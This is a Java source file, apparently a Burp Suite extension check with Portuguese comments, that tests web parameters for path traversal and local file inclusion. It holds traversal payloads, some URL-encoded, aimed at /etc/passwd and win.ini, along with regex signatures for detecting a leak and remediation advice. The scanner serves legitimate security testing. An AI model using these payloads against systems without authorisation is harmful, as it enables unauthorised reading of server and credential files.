package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.VulnCheck;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * Testa parâmetros que costumam servir arquivos (file, path, page, template,
 * document...) com payloads clássicos de Path Traversal / Local File
 * Inclusion, procurando pela assinatura de /etc/passwd (Linux) ou win.ini
 * (Windows) refletida na resposta.
 *
 * Criado por Rx0 - @rodrigocoutinho91
 */
public class PathTraversalCheck implements VulnCheck {

    private static final String[] PARAM_NAMES = {
            "file", "path", "page", "document", "doc", "template", "filename",
            "include", "load", "view", "folder", "dir", "download"
    };

    private static final String[] PAYLOADS = {
            "../../../../../../etc/passwd",
            "....//....//....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "/etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    };

    private static final Pattern ASSINATURA_PASSWD = Pattern.compile("root:.*:0:0:", Pattern.CASE_INSENSITIVE);
    private static final Pattern ASSINATURA_WININI = Pattern.compile("\\[extensions\\]|\\[fonts\\]", Pattern.CASE_INSENSITIVE);

    @Override
    public String nome() {
        return "Path Traversal / Local File Inclusion";
    }

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl) {
        List<Finding> achados = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        for (String param : PARAM_NAMES) {
            for (String payload : PAYLOADS) {
                try {
                    String url = base + "/?" + param + "=" + payload; // sem URL-encode total: alguns servidores só normalizam decodificado
                    HttpRequest req = HttpRequest.httpRequestFromUrl(url);
                    HttpResponse resp = api.http().sendRequest(req).response();
                    if (resp == null) continue;

                    String body = resp.bodyToString();
                    if (body == null) continue;

                    boolean achouPasswd = ASSINATURA_PASSWD.matcher(body).find();
                    boolean achouWinIni = ASSINATURA_WININI.matcher(body).find();

                    if (achouPasswd || achouWinIni) {
                        achados.add(new Finding(
                                "Possível Path Traversal / LFI no parâmetro '" + param + "'",
                                Severity.CRITICA,
                                url,
                                "O envio de um payload de travessia de diretório resultou em conteúdo de arquivo de sistema " +
                                        "(" + (achouPasswd ? "/etc/passwd" : "win.ini") + ") refletido na resposta — o parâmetro permite " +
                                        "leitura arbitrária de arquivos do servidor.",
                                "Payload: " + payload,
                                "Nunca monte caminhos de arquivo a partir de entrada do usuário. Use um mapa fixo de IDs para arquivos " +
                                        "permitidos (allowlist) e normalize/valide o caminho resultante antes de qualquer acesso ao filesystem."));
                        break; // já confirmado nesse param, não precisa testar os outros payloads
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Erro no check de Path Traversal (param " + param + "): " + e.getMessage());
                }
            }
        }
        return achados;
    }
}
